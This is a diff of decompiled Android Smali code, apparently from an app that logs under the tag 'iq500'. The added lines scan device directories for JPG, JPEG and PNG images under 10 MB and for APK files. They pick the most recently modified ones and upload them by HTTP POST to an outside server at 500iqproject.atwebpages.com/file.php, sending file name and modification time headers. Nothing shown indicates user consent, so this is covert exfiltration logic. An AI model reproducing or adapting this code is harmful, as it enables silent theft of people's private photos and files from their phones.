-    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v34
-
-    const-string v35, "///n"
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v34
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-
-    move-result-object v34
-
-    move-object/from16 v19, v34
-
-    .line 91
-    :cond_3cb
-    add-int/lit8 v21, v21, 0x1
-
-    goto/16 :goto_107
-
-    .line 96
-    :cond_3cf
-    const/16 v34, 0x1
-
-    goto/16 :goto_30c
-
-    .line 111
-    :cond_3d3
-    move-object/from16 v34, v18
-
-    move/from16 v35, v21
-
-    aget-object v34, v34, v35
-
-    const-string v35, ".apk"
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
-
-    move-result v34
-
-    new-instance v35, Ljava/lang/Boolean;
-
-    move/from16 v42, v34
-
-    move-object/from16 v43, v35
-
-    move-object/from16 v34, v43
-
-    move/from16 v35, v42
-
-    move-object/from16 v36, v43
-
-    move/from16 v42, v35
-
-    move-object/from16 v43, v36
-
-    move-object/from16 v35, v43
-
-    move/from16 v36, v42
-
-    invoke-direct/range {v35 .. v36}, Ljava/lang/Boolean;-><init>(Z)V
-
-    move-object/from16 v22, v34
-
-    .line 112
-    new-instance v34, Ljava/io/File;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    new-instance v36, Ljava/lang/StringBuffer;
-
-    move-object/from16 v42, v36
-
-    move-object/from16 v36, v42
-
-    move-object/from16 v37, v42
-
-    invoke-direct/range {v37 .. v37}, Ljava/lang/StringBuffer;-><init>()V
-
-    move-object/from16 v37, v14
-
-    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v36
-
-    move-object/from16 v37, v18
-
-    move/from16 v38, v21
-
-    aget-object v37, v37, v38
-
-    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v36
-
-    invoke-virtual/range {v36 .. v36}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-
-    move-result-object v36
-
-    invoke-direct/range {v35 .. v36}, Ljava/io/File;-><init>(Ljava/lang/String;)V
-
-    invoke-virtual/range {v34 .. v34}, Ljava/io/File;->length()J
-
-    move-result-wide v34
-
-    const/16 v36, 0x400
-
-    move/from16 v0, v36
-
-    int-to-long v0, v0
-
-    move-wide/from16 v36, v0
-
-    div-long v34, v34, v36
-
-    const/16 v36, 0x400
-
-    move/from16 v0, v36
-
-    int-to-long v0, v0
-
-    move-wide/from16 v36, v0
-
-    div-long v34, v34, v36
-
-    const/16 v36, 0x5
-
-    move/from16 v0, v36
-
-    int-to-long v0, v0
-
-    move-wide/from16 v36, v0
-
-    cmp-long v34, v34, v36
-
-    if-lez v34, :cond_4e0
-
-    const/16 v34, 0x0
-
-    :goto_445
-    new-instance v35, Ljava/lang/Boolean;
-
-    move/from16 v42, v34
-
-    move-object/from16 v43, v35
-
-    move-object/from16 v34, v43
-
-    move/from16 v35, v42
-
-    move-object/from16 v36, v43
-
-    move/from16 v42, v35
-
-    move-object/from16 v43, v36
-
-    move-object/from16 v35, v43
-
-    move/from16 v36, v42
-
-    invoke-direct/range {v35 .. v36}, Ljava/lang/Boolean;-><init>(Z)V
-
-    move-object/from16 v23, v34
-
-    .line 114
-    move-object/from16 v34, v22
-
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v34
-
-    if-nez v34, :cond_4dc
-
-    move-object/from16 v34, v23
-
-    check-cast v34, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v34
-
-    if-eqz v34, :cond_4dc
-
-    .line 116
-    new-instance v34, Ljava/lang/StringBuffer;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    invoke-direct/range {v35 .. v35}, Ljava/lang/StringBuffer;-><init>()V
-
-    move-object/from16 v35, v20
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v34
-
-    new-instance v35, Ljava/lang/StringBuffer;
-
-    move-object/from16 v42, v35
-
-    move-object/from16 v35, v42
-
-    move-object/from16 v36, v42
-
-    invoke-direct/range {v36 .. v36}, Ljava/lang/StringBuffer;-><init>()V
-
-    move-object/from16 v36, v14
-
-    invoke-virtual/range {v35 .. v36}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v35
-
-    move-object/from16 v36, v18
-
-    move/from16 v37, v21
-
-    aget-object v36, v36, v37
-
-    invoke-virtual/range {v35 .. v36}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v35
-
-    invoke-virtual/range {v35 .. v35}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-
-    move-result-object v35
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v34
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-
-    move-result-object v34
-
-    move-object/from16 v20, v34
-
-    .line 118
-    move/from16 v34, v21
-
-    move-object/from16 v35, v18
-
-    move-object/from16 v0, v35
-
-    array-length v0, v0
-
-    move/from16 v35, v0
-
-    const/16 v36, 0x1
-
-    add-int/lit8 v35, v35, -0x1
-
-    move/from16 v0, v34
-
-    move/from16 v1, v35
-
-    if-ge v0, v1, :cond_4dc
-
-    .line 119
-    new-instance v34, Ljava/lang/StringBuffer;
-
-    move-object/from16 v42, v34
-
-    move-object/from16 v34, v42
-
-    move-object/from16 v35, v42
-
-    invoke-direct/range {v35 .. v35}, Ljava/lang/StringBuffer;-><init>()V
-
-    move-object/from16 v35, v20
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v34
-
-    const-string v35, "///n"
-
-    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
-
-    move-result-object v34
-
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
-
-    move-result-object v34
-
-    move-object/from16 v20, v34
+    move-object/from16 v22, v38
 
     .line 109
-    :cond_4dc
-    add-int/lit8 v21, v21, 0x1
-
-    goto/16 :goto_11a
-
-    .line 112
-    :cond_4e0
-    const/16 v34, 0x1
-
-    goto/16 :goto_445
-
-    .line 132
-    :cond_4e4
-    move-wide/from16 v34, v25
-
-    move-wide/from16 v30, v34
-
-    .line 133
-    move-wide/from16 v34, v25
-
-    new-instance v36, Ljava/io/File;
-
-    move-object/from16 v42, v36
-
-    move-object/from16 v36, v42
-
-    move-object/from16 v37, v42
-
     move-object/from16 v38, v21
 
-    move/from16 v39, v29
+    if-nez v38, :cond_157
 
-    aget-object v38, v38, v39
+    .line 111
+    move-object/from16 v38, v19
 
-    invoke-direct/range {v37 .. v38}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+    invoke-virtual/range {v38 .. v38}, Ljava/io/File;->list()[Ljava/lang/String;
 
-    invoke-virtual/range {v36 .. v36}, Ljava/io/File;->lastModified()J
+    move-result-object v38
 
-    move-result-wide v36
+    move-object/from16 v21, v38
 
-    invoke-static/range {v34 .. v37}, Ljava/lang/Math;->max(JJ)J
+    .line 112
+    move-object/from16 v38, v16
 
-    move-result-wide v34
+    move-object/from16 v15, v38
 
-    move-wide/from16 v25, v34
+    .line 116
+    :cond_157
+    const-string v38, ""
 
-    .line 134
-    move-wide/from16 v34, v30
+    move-object/from16 v23, v38
 
-    move-wide/from16 v36, v25
+    .line 117
+    const-string v38, ""
 
-    cmp-long v34, v34, v36
+    move-object/from16 v24, v38
 
-    if-eqz v34, :cond_515
+    .line 119
+    move-object/from16 v38, v21
 
-    .line 135
-    move-object/from16 v34, v21
+    if-eqz v38, :cond_176
 
-    move/from16 v35, v29
+    .line 120
+    const/16 v38, 0x0
 
-    aget-object v34, v34, v35
+    move/from16 v25, v38
 
-    move-object/from16 v23, v34
+    :goto_167
+    move/from16 v38, v25
 
-    .line 130
-    :cond_515
-    add-int/lit8 v29, v29, 0x1
+    move-object/from16 v39, v21
 
-    goto/16 :goto_15b
+    move-object/from16 v0, v39
 
-    .line 140
-    :cond_519
-    move-wide/from16 v34, v27
+    array-length v0, v0
 
-    move-wide/from16 v30, v34
+    move/from16 v39, v0
 
-    .line 141
-    move-wide/from16 v34, v27
+    move/from16 v0, v38
 
-    new-instance v36, Ljava/io/File;
+    move/from16 v1, v39
 
-    move-object/from16 v42, v36
-
-    move-object/from16 v36, v42
-
-    move-object/from16 v37, v42
-
-    move-object/from16 v38, v22
-
-    move/from16 v39, v29
-
-    aget-object v38, v38, v39
-
-    invoke-direct/range {v37 .. v38}, Ljava/io/File;-><init>(Ljava/lang/String;)V
-
-    invoke-virtual/range {v36 .. v36}, Ljava/io/File;->lastModified()J
-
-    move-result-wide v36
-
-    invoke-static/range {v34 .. v37}, Ljava/lang/Math;->max(JJ)J
-
-    move-result-wide v34
-
-    move-wide/from16 v27, v34
-
-    .line 142
-    move-wide/from16 v34, v30
-
-    move-wide/from16 v36, v27
-
-    cmp-long v34, v34, v36
-
-    if-eqz v34, :cond_54a
-
-    .line 143
-    move-object/from16 v34, v22
-
-    move/from16 v35, v29
-
-    aget-object v34, v34, v35
-    :try_end_548
-    .catch Ljava/lang/Exception; {:try_start_ab .. :try_end_548} :catch_54e
-
-    move-object/from16 v24, v34
+    if-lt v0, v1, :cond_2b5
 
     .line 138
-    :cond_54a
-    add-int/lit8 v29, v29, 0x1
+    :cond_176
+    move-object/from16 v38, v22
 
-    goto/16 :goto_16e
+    if-eqz v38, :cond_18d
 
-    .line 181
-    :catch_54e
-    move-exception v34
+    .line 139
+    const/16 v38, 0x0
 
-    move-object/from16 v12, v34
+    move/from16 v25, v38
 
-    .line 187
-    move-object/from16 v34, v12
+    :goto_17e
+    move/from16 v38, v25
 
-    :try_start_553
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Exception;->printStackTrace()V
+    move-object/from16 v39, v22
 
-    .line 188
-    const-string v34, "iq500"
+    move-object/from16 v0, v39
 
-    move-object/from16 v35, v12
+    array-length v0, v0
 
-    invoke-virtual/range {v35 .. v35}, Ljava/lang/Exception;->toString()Ljava/lang/String;
+    move/from16 v39, v0
 
-    move-result-object v35
+    move/from16 v0, v38
 
-    invoke-static/range {v34 .. v35}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
-    :try_end_561
-    .catch Ljava/lang/Exception; {:try_start_553 .. :try_end_561} :catch_564
+    move/from16 v1, v39
 
-    move-result v34
+    if-lt v0, v1, :cond_438
 
-    goto/16 :goto_24f
+    .line 153
+    :cond_18d
+    move-object/from16 v38, v23
 
-    :catch_564
-    move-exception v34
+    const-string v39, "///n"
 
-    move-object/from16 v4, v34
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
 
-    .line 192
-    move-object/from16 v34, v4
+    move-result-object v38
 
-    invoke-virtual/range {v34 .. v34}, Ljava/lang/Exception;->printStackTrace()V
+    move-object/from16 v25, v38
+
+    .line 154
+    move-object/from16 v38, v24
+
+    const-string v39, "///n"
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+
+    move-result-object v38
+
+    move-object/from16 v26, v38
+
+    .line 155
+    const-string v38, ""
+
+    move-object/from16 v27, v38
+
+    .line 156
+    const-string v38, ""
+
+    move-object/from16 v28, v38
+
+    .line 157
+    const/16 v38, 0x0
+
+    move/from16 v0, v38
+
+    int-to-long v0, v0
+
+    move-wide/from16 v38, v0
+
+    move-wide/from16 v29, v38
+
+    .line 158
+    const/16 v38, 0x0
+
+    move/from16 v0, v38
+
+    int-to-long v0, v0
+
+    move-wide/from16 v38, v0
+
+    move-wide/from16 v31, v38
+
+    .line 160
+    const/16 v38, 0x0
+
+    move/from16 v33, v38
+
+    :goto_1bf
+    move/from16 v38, v33
+
+    move-object/from16 v39, v25
+
+    move-object/from16 v0, v39
+
+    array-length v0, v0
+
+    move/from16 v39, v0
+
+    move/from16 v0, v38
+
+    move/from16 v1, v39
+
+    if-lt v0, v1, :cond_549
+
+    .line 168
+    const/16 v38, 0x0
+
+    move/from16 v33, v38
+
+    :goto_1d2
+    move/from16 v38, v33
+
+    move-object/from16 v39, v26
+
+    move-object/from16 v0, v39
+
+    array-length v0, v0
+
+    move/from16 v39, v0
+
+    move/from16 v0, v38
+
+    move/from16 v1, v39
+
+    if-lt v0, v1, :cond_57e
+
+    .line 177
+    move-object/from16 v38, v27
+
+    const-string v39, ""
+
+    move-object/from16 v0, v38
+
+    move-object/from16 v1, v39
+
+    if-eq v0, v1, :cond_24a
+
+    .line 180
+    new-instance v38, Ljava/io/File;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    move-object/from16 v40, v27
+
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v33, v38
+
+    .line 183
+    new-instance v38, Lorg/apache/http/entity/FileEntity;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    move-object/from16 v40, v33
+
+    const-string v41, "binary/octet-stream"
+
+    invoke-direct/range {v39 .. v41}, Lorg/apache/http/entity/FileEntity;-><init>(Ljava/io/File;Ljava/lang/String;)V
+
+    move-object/from16 v34, v38
+
+    .line 186
+    new-instance v38, Lorg/apache/http/client/methods/HttpPost;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    const-string v40, "http://500iqproject.atwebpages.com/file.php"
+
+    invoke-direct/range {v39 .. v40}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v35, v38
+
+    .line 189
+    move-object/from16 v38, v35
+
+    move-object/from16 v39, v34
+
+    invoke-virtual/range {v38 .. v39}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
+
+    .line 190
+    move-object/from16 v38, v34
+
+    const-string v39, "binary/octet-stream"
+
+    invoke-virtual/range {v38 .. v39}, Lorg/apache/http/entity/FileEntity;->setContentType(Ljava/lang/String;)V
 
     .line 193
-    const-string v34, "iq500"
+    move-object/from16 v38, v35
 
-    move-object/from16 v35, v4
+    const-string v39, "lmod"
 
-    invoke-virtual/range {v35 .. v35}, Ljava/lang/Exception;->toString()Ljava/lang/String;
+    move-wide/from16 v40, v29
 
-    move-result-object v35
+    invoke-static/range {v40 .. v41}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;
 
-    invoke-static/range {v34 .. v35}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
+    move-result-object v40
 
-    move-result v34
+    invoke-virtual/range {v38 .. v40}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V
 
-    goto/16 :goto_24f
+    .line 196
+    new-instance v38, Lorg/apache/http/impl/client/DefaultHttpClient;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    invoke-direct/range {v39 .. v39}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
+
+    move-object/from16 v36, v38
+
+    .line 197
+    move-object/from16 v38, v36
+
+    move-object/from16 v39, v35
+
+    invoke-interface/range {v38 .. v39}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
+
+    move-result-object v38
+
+    .line 201
+    :cond_24a
+    move-object/from16 v38, v28
+
+    const-string v39, ""
+
+    move-object/from16 v0, v38
+
+    move-object/from16 v1, v39
+
+    if-eq v0, v1, :cond_2b3
+
+    .line 203
+    new-instance v38, Ljava/io/File;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    move-object/from16 v40, v28
+
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v33, v38
+
+    .line 204
+    new-instance v38, Lorg/apache/http/entity/FileEntity;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    move-object/from16 v40, v33
+
+    const-string v41, "binary/octet-stream"
+
+    invoke-direct/range {v39 .. v41}, Lorg/apache/http/entity/FileEntity;-><init>(Ljava/io/File;Ljava/lang/String;)V
+
+    move-object/from16 v34, v38
+
+    .line 205
+    new-instance v38, Lorg/apache/http/client/methods/HttpPost;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    const-string v40, "http://500iqproject.atwebpages.com/file.php"
+
+    invoke-direct/range {v39 .. v40}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v35, v38
+
+    .line 207
+    move-object/from16 v38, v35
+
+    move-object/from16 v39, v34
+
+    invoke-virtual/range {v38 .. v39}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
+
+    .line 208
+    move-object/from16 v38, v34
+
+    const-string v39, "binary/octet-stream"
+
+    invoke-virtual/range {v38 .. v39}, Lorg/apache/http/entity/FileEntity;->setContentType(Ljava/lang/String;)V
+
+    .line 209
+    move-object/from16 v38, v35
+
+    const-string v39, "fname"
+
+    move-object/from16 v40, v33
+
+    invoke-virtual/range {v40 .. v40}, Ljava/io/File;->getName()Ljava/lang/String;
+
+    move-result-object v40
+
+    invoke-virtual/range {v38 .. v40}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 210
+    new-instance v38, Lorg/apache/http/impl/client/DefaultHttpClient;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    invoke-direct/range {v39 .. v39}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
+
+    move-object/from16 v36, v38
+
+    .line 211
+    move-object/from16 v38, v36
+
+    move-object/from16 v39, v35
+
+    invoke-interface/range {v38 .. v39}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
+
+    move-result-object v38
+
+    .line 223
+    :cond_2b3
+    :goto_2b3
+    goto/16 :goto_3a
+
+    .line 122
+    :cond_2b5
+    move-object/from16 v38, v21
+
+    move/from16 v39, v25
+
+    aget-object v38, v38, v39
+
+    const-string v39, ".jpg"
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
+
+    move-result v38
+
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v26, v38
+
+    .line 123
+    move-object/from16 v38, v21
+
+    move/from16 v39, v25
+
+    aget-object v38, v38, v39
+
+    const-string v39, ".jpeg"
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
+
+    move-result v38
+
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v27, v38
+
+    .line 124
+    move-object/from16 v38, v21
+
+    move/from16 v39, v25
+
+    aget-object v38, v38, v39
+
+    const-string v39, ".png"
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
+
+    move-result v38
+
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v28, v38
+
+    .line 125
+    new-instance v38, Ljava/io/File;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    new-instance v40, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v40
+
+    move-object/from16 v40, v46
+
+    move-object/from16 v41, v46
+
+    invoke-direct/range {v41 .. v41}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v41, v15
+
+    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v40
+
+    move-object/from16 v41, v21
+
+    move/from16 v42, v25
+
+    aget-object v41, v41, v42
+
+    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v40
+
+    invoke-virtual/range {v40 .. v40}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v40
+
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual/range {v38 .. v38}, Ljava/io/File;->length()J
+
+    move-result-wide v38
+
+    const/16 v40, 0x400
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    div-long v38, v38, v40
+
+    const/16 v40, 0x400
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    div-long v38, v38, v40
+
+    const/16 v40, 0xa
+
+    move/from16 v0, v40
+
+    int-to-long v0, v0
+
+    move-wide/from16 v40, v0
+
+    cmp-long v38, v38, v40
+
+    if-lez v38, :cond_434
+
+    const/16 v38, 0x0
+
+    :goto_371
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v29, v38
+
+    .line 127
+    move-object/from16 v38, v26
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-eqz v38, :cond_39e
+
+    move-object/from16 v38, v29
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-nez v38, :cond_3c6
+
+    :cond_39e
+    move-object/from16 v38, v27
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-eqz v38, :cond_3b2
+
+    move-object/from16 v38, v29
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-nez v38, :cond_3c6
+
+    :cond_3b2
+    move-object/from16 v38, v28
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-eqz v38, :cond_430
+
+    move-object/from16 v38, v29
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-eqz v38, :cond_430
+
+    .line 129
+    :cond_3c6
+    new-instance v38, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    invoke-direct/range {v39 .. v39}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v39, v23
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v38
+
+    new-instance v39, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v39
+
+    move-object/from16 v39, v46
+
+    move-object/from16 v40, v46
+
+    invoke-direct/range {v40 .. v40}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v40, v15
+
+    invoke-virtual/range {v39 .. v40}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v39
+
+    move-object/from16 v40, v21
+
+    move/from16 v41, v25
+
+    aget-object v40, v40, v41
+
+    invoke-virtual/range {v39 .. v40}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v39
+
+    invoke-virtual/range {v39 .. v39}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v39
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v38
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v38
+
+    move-object/from16 v23, v38
+
+    .line 131
+    move/from16 v38, v25
+
+    move-object/from16 v39, v21
+
+    move-object/from16 v0, v39
+
+    array-length v0, v0
+
+    move/from16 v39, v0
+
+    const/16 v40, 0x1
+
+    add-int/lit8 v39, v39, -0x1
+
+    move/from16 v0, v38
+
+    move/from16 v1, v39
+
+    if-ge v0, v1, :cond_430
+
+    .line 132
+    new-instance v38, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    invoke-direct/range {v39 .. v39}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v39, v23
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v38
+
+    const-string v39, "///n"
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v38
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v38
+
+    move-object/from16 v23, v38
+
+    .line 120
+    :cond_430
+    add-int/lit8 v25, v25, 0x1
+
+    goto/16 :goto_167
+
+    .line 125
+    :cond_434
+    const/16 v38, 0x1
+
+    goto/16 :goto_371
+
+    .line 141
+    :cond_438
+    move-object/from16 v38, v22
+
+    move/from16 v39, v25
+
+    aget-object v38, v38, v39
+
+    const-string v39, ".apk"
+
+    invoke-virtual/range {v38 .. v39}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
+
+    move-result v38
+
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v26, v38
+
+    .line 142
+    new-instance v38, Ljava/io/File;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    new-instance v40, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v40
+
+    move-object/from16 v40, v46
+
+    move-object/from16 v41, v46
+
+    invoke-direct/range {v41 .. v41}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v41, v17
+
+    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v40
+
+    move-object/from16 v41, v22
+
+    move/from16 v42, v25
+
+    aget-object v41, v41, v42
+
+    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v40
+
+    invoke-virtual/range {v40 .. v40}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v40
+
